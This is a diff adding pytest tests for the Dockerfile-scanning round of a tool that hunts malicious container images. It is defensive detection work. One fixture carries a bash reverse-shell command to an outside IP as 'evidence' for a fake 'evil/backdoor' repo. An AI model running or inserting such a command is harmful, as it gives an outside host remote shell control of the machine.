@@ -365,3 +365,72 @@ def test_run_one_hunt_swallows_a_crashing_run_hunt():
     from knorr.watch import _run_one_hunt
     with patch("knorr.hunt.run_hunt", side_effect=RuntimeError("simulated crash")):
         _run_one_hunt("docker", Path("unused.sqlite"), 10, 1, 0.0)  # must not raise
+
+
+# ---------------------------------------------------------------------------
+# _run_dockerfile_round: the non-crypto discovery angle. Docker Hub/GHCR
+# keyword search is structurally biased toward cryptomining (miners are
+# commonly named after their own tool; reverse shells/C2/droppers are not),
+# so without this round confirmed findings skew almost entirely cryptojacking
+# regardless of what is actually out there.
+# ---------------------------------------------------------------------------
+
+def test_run_dockerfile_round_is_exception_guarded():
+    import inspect
+
+    from knorr.watch import _run_dockerfile_round
+    source = inspect.getsource(_run_dockerfile_round)
+    assert "except Exception" in source
+
+
+def test_run_dockerfile_round_swallows_a_crashing_scan():
+    """A scan_dockerfiles() call that raises must not propagate."""
+    from knorr.watch import _run_dockerfile_round
+    with patch("knorr.scanning.dockerfile.scan_dockerfiles",
+              side_effect=RuntimeError("simulated crash")):
+        _run_dockerfile_round(Path("unused.sqlite"))  # must not raise
+
+
+def test_run_dockerfile_round_persists_confirmed_hits(tmp_path):
+    from knorr.scanning.dockerfile import DockerfileHit
+    from knorr.watch import _run_dockerfile_round
+
+    db_path = tmp_path / "w.sqlite"
+    Database.open(db_path).close()
+    hit = DockerfileHit(
+        repo="evil/backdoor", path="Dockerfile",
+        url="https://github.com/evil/backdoor/blob/main/Dockerfile",
+        score=5, tier="A:reverse_shell", confirmed=True,
+        signals=["reverse_shell/bash-tcp"],
+        confirming=[{"category": "reverse_shell", "rule": "bash-tcp",
+                     "evidence": "bash -i >&/dev/tcp/1.2.3.4/80 0>&1"}])
+    with patch("knorr.scanning.dockerfile.scan_dockerfiles", return_value=[hit]), \
+         patch("knorr.feeds.github.GitHubClient"):
+        _run_dockerfile_round(db_path)
+
+    db = Database.open(db_path)
+    row = db.conn.execute("SELECT status FROM image_findings "
+                          "WHERE image='github.com/evil/backdoor:dockerfile'").fetchone()
+    db.close()
+    assert row["status"] == "confirmed"
+
+
+def test_watch_dispatches_dockerfiles_registry(tmp_path, monkeypatch):
+    """"dockerfiles" in --registries must route to _run_dockerfile_round, not
+    the registry-hunt path."""
+    db_path = tmp_path / "w.sqlite"
+    Database.open(db_path).close()
+    fake_time = {"t": 1000.0}
+    monkeypatch.setattr("knorr.watch.time.time", lambda: fake_time["t"])
+    monkeypatch.setattr("knorr.watch.time.sleep", lambda s: fake_time.update(t=fake_time["t"] + s))
+
+    dockerfile_mock = MagicMock()
+    hunt_mock = MagicMock()
+    with patch("knorr.watch._run_dockerfile_round", dockerfile_mock), \
+         patch("knorr.watch._run_one_hunt", hunt_mock), \
+         patch("knorr.watch._post_alert", return_value=True):
+        watch(duration_seconds=15, db_path=db_path, webhook=None,
+              registries=["dockerfiles"], round_pause=20)
+
+    dockerfile_mock.assert_called_once_with(db_path)
+    hunt_mock.assert_not_called()
